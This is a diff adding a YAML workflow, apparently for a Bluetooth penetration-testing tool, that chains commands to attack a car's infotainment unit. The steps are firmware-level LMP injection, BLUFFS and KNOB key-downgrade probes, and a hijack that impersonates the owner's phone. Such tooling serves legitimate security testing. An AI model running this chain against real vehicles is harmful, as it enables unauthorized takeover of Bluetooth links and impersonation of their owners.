@@ -1,0 +1,26 @@
+name: IVI Attack Chain
+description: Full automotive IVI exploitation workflow
+duration: ~30 minutes
+risk: high (active exploitation)
+requires:
+  - DarkFirmware adapter
+  - Phone MAC address (--phone)
+
+steps:
+  - command: assess {target} --active -i {hci}
+    description: Initial assessment
+
+  - command: adapter firmware-set lmp-size 17
+    description: Unlock full LMP PDU injection
+
+  - command: bluffs {target} --variant probe -i {hci}
+    description: Test BLUFFS session key downgrade
+
+  - command: knob probe {target} -i {hci}
+    description: Test KNOB key size reduction
+
+  - command: hijack {target} {phone} -i {hci}
+    description: Full hijack chain (impersonate phone)
+
+  - command: report -o ivi_attack_report.html
+    description: Generate attack report
